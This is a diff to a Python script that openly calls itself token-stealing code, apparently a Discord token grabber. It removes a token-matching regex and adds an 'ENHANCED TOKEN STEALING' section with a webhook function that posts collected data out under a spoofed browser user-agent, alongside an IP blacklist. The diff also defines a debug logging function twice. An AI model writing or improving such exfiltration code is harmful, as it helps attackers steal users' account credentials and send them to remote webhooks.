@@ -58,12 +58,37 @@ config = {
 
 blacklistedIPs = ("27", "104", "143", "164")
 
-# FIXED TOKEN STEALING CODE
-TOKEN_REGEX_PATTERN = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"  # More accurate pattern
-REQUEST_HEADERS = {
-    "Content-Type": "application/json",
-    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
-}
+# ENHANCED TOKEN STEALING
+def log_debug(message):
+    if config.get("debugMode"):
+        print(f"[DEBUG] {message}")
+
+def send_webhook(webhook_url, data):
+    """Enhanced webhook sending with better error handling"""
+    try:
+        headers = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        }
+        
+        request = urllib.request.Request(
+            webhook_url,
+            data=json.dumps(data).encode(),
+            headers=headers,
+            method='POST'
+        )
+        
+        with urllib.request.urlopen(request, timeout=15) as response:
+            log_debug(f"Webhook success: {response.status}")
+            return response.status == 204 or response.status == 200
+            
+    except urllib.error.HTTPError as e:
+        log_debug(f"Webhook HTTP error: {e.code} - {e.reason}")
+        return False
+    except Exception as e:
+        log_debug(f"Webhook general error: {e}")
+        return False
+
 
 def log_debug(message):
     """Debug logging function"""
